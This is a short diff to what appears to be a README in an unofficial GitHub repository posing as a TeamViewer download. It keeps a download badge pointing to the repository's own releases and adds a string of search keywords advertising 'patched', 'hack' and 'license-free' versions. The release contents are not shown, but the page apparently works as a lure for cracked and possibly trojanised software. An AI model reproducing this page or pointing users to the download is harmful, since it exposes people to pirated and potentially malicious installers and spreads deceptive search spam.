@@ -11,3 +11,7 @@ TeamViewer QuickSupport is a compact and portable application with the required 
 </ol>
 <a href="https://github.com/masambo1436/TeamViewer/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
+
+
+
+## teamviewer teamviewer-api teamviewer-download teamviewer-full teamviewer-patched teamviewer-hack teamviewer-license teamviewer-key-license teamviewer-license-download teamviewer-license-free teamviewer-15 
